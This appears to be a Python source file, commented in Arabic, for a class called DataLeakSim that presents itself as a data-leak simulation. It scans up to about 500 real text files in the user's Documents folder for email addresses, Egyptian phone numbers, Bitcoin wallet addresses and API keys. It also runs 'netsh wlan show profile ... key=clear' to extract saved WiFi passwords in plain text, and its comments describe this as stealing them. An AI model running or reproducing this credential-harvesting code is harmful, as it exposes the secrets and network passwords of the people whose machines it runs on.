import os
import re
import subprocess

class DataLeakSim:
    def __init__(self):
        self.leaked_data = []
        # أنماط البحث (Regex) عن بيانات حقيقية
        self.patterns = {
            "Email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            "Phone (EG)": r'(010|011|012|015)[0-9]{8}',
            "Bitcoin Wallet": r'\b(bc1|[13])[a-zA-Z0-9]{25,39}\b',
            "API Key": r'(api_key|access_token)[\s=:"\']{1,3}[a-zA-Z0-9\-_]{20,}'
        }

    def scan_user_files(self):
        """فحص ملفات المستخدم الحقيقية بحثاً عن أسرار"""
        target_dir = os.path.join(os.path.expanduser("~"), "Documents")
        self.leaked_data.append(f"[*] Scanning REAL user files in: {target_dir}")
        
        scanned_count = 0
        found_secrets = 0

        # الامتدادات اللي هنفحصها (نصية فقط عشان السرعة)
        valid_exts = ['.txt', '.py', '.js', '.json', '.xml', '.csv', '.md']

        for root, _, files in os.walk(target_dir):
            if scanned_count > 500: break # كفاية 500 ملف عشان الجهاز ميهنجش
            
            for file in files:
                if any(file.endswith(ext) for ext in valid_exts):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            # البحث عن الأنماط داخل الملف
                            for p_name, pattern in self.patterns.items():
                                matches = re.findall(pattern, content)
                                if matches:
                                    # لقينا سر!
                                    clean_matches = list(set(matches))[:3] # خد أول 3 بس
                                    self.leaked_data.append(f"⚠️ FOUND {p_name} in '{file}': {clean_matches}")
                                    found_secrets += 1
                        
                        scanned_count += 1
                    except: pass
        
        if found_secrets == 0:
            self.leaked_data.append("✅ No PII/Secrets found in your Documents.")
        else:
            self.leaked_data.append(f"❌ CRITICAL: Found {found_secrets} sensitive items in your files!")

    def exfiltrate_wifi_passwords(self):
        """سرقة باسوردات الواي فاي الحقيقية"""
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='cp850', errors='ignore')
            profiles = [line.split(":")[1].strip() for line in data.split('\n') if "All User Profile" in line or "ملفات تعريف" in line]
            
            leak_count = 0
            for profile in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], encoding='cp850', errors='ignore')
                    if "Key Content" in results or "محتوى المفتاح" in results:
                        # استخراج الباسورد
                        for line in results.split('\n'):
                            if "Key Content" in line or "محتوى المفتاح" in line:
                                password = line.split(":")[1].strip()
                                self.leaked_data.append(f"🔓 WiFi: {profile} | Pass: {password}")
                                leak_count += 1
                except: pass
        except: pass

    def run_simulation(self):
        self.leaked_data = ["🚀 STARTING REAL DATA ANALYSIS..."]
        
        # 1. فحص ملفاتك الحقيقية
        self.scan_user_files()
        
        # 2. سرقة واي فاي حقيقي
        self.leaked_data.append("-" * 30)
        self.exfiltrate_wifi_passwords()
        
        return "\n".join(self.leaked_data)